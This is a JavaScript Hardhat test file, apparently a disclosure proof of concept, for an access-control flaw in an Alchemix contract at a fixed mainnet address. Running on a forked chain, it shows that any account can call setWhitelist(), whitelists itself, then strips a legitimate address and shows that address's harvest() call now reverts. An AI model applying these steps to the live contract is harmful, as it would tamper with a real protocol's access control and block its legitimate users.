const { expect } = require("chai");
const { ethers } = require("hardhat");
const {expectRevert} = require("@openzeppelin/test-helpers");

describe("Alchemix Access Control Exploit PoC", function () {
  this.timeout("250000");
  let target;
  let accounts;
  before(async () => {
    // init the deployed contract and accounts
    target = await hre.ethers.getVerifiedContractAt("0x6B566554378477490ab040f6F757171c967D03ab");
    accounts = await ethers.getSigners();
  });
  
  it("Read the correct address", async function () {   
    console.log("the contract address at block 13267300 is: " + await target.transmuter());
  });

  it("Verify whitelist access control issue", async function () {
    console.log("Current User Address: " + accounts[0].address);
    console.log("Am I whitelisted? : " + await target.whitelist(accounts[0].address));

    //calling setWhitelist()
    await target.setWhitelist([accounts[0].address],[true]);
    console.log("Am I whitelisted? : " + await target.whitelist(accounts[0].address));

    expect(await target.whitelist(accounts[0].address)).to.equal(true);
  });

  it("Prevent legitimate harvest calls", async function () {
    //assume legitActor to be a legitimate user
    const legitActor = '0x51e029a5ef288fb87c5e8dd46895c353ad9aaaec';
    const fundingAccount = accounts[0].address;
    //const legitActor2 = '0x07c6adbb822833e93aa8fb6a24d9cf04365c0868';

   //Remove the legitimate actor from the whitelist
   await target.setWhitelist([legitActor],[false]);
   console.log("Am I whitelisted? : " + await target.whitelist(legitActor));
   
   //Impersonate the legitActor account
   await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [legitActor]}
   );

   const legitActorSigner = await ethers.provider.getSigner(legitActor);
   const fundingAccountSigner = await ethers.provider.getSigner(fundingAccount);

  await fundingAccountSigner.sendTransaction({
    to: legitActor,
    value: ethers.utils.parseEther("2.0"), // Sends exactly 2.0 ether
  });

  //Replay the tx and expect it to fail/revert
  await expectRevert.unspecified(target.connect(legitActorSigner).harvest(0));
  });

});